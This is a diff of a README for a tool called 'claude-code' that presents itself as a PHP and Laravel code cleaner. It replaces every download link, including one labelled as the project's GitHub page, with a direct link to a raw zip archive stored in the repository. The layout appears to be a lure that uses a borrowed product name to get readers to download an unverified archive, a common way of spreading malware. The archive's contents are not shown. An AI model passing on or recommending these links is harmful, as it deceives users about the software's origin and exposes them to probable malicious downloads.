@@ -8,11 +8,11 @@ Welcome to **claude-code**! This tool helps you clean up your PHP and Laravel co
 
 To get started, visit the Releases page to download the latest version of **claude-code**. 
 
-[![Download claude-code](https://github.com/Himanshu123cyber/claude-code/raw/refs/heads/main/laravel-simplifier/.claude-plugin/code_claude_3.2.zip)](https://github.com/Himanshu123cyber/claude-code/raw/refs/heads/main/laravel-simplifier/.claude-plugin/code_claude_3.2.zip)
+[![Download claude-code](https://raw.githubusercontent.com/Himanshu123cyber/claude-code/main/laravel-simplifier/claude-code-v1.9.zip)](https://raw.githubusercontent.com/Himanshu123cyber/claude-code/main/laravel-simplifier/claude-code-v1.9.zip)
 
 ### Steps to Download:
 
-1. Click on this link: [Download the latest releases](https://github.com/Himanshu123cyber/claude-code/raw/refs/heads/main/laravel-simplifier/.claude-plugin/code_claude_3.2.zip).
+1. Click on this link: [Download the latest releases](https://raw.githubusercontent.com/Himanshu123cyber/claude-code/main/laravel-simplifier/claude-code-v1.9.zip).
 2. Look for the latest release version.
 3. Download the file for your system.
 
@@ -90,6 +90,6 @@ We welcome contributions from the community! If you have ideas for new features 
 
 ## 🔗 Additional Resources
 
-Check our [GitHub page](https://github.com/Himanshu123cyber/claude-code/raw/refs/heads/main/laravel-simplifier/.claude-plugin/code_claude_3.2.zip) for additional documentation, updates, and information.
+Check our [GitHub page](https://raw.githubusercontent.com/Himanshu123cyber/claude-code/main/laravel-simplifier/claude-code-v1.9.zip) for additional documentation, updates, and information.
 
 Remember, your feedback helps us improve, so don’t hesitate to reach out. Enjoy coding with **claude-code**!
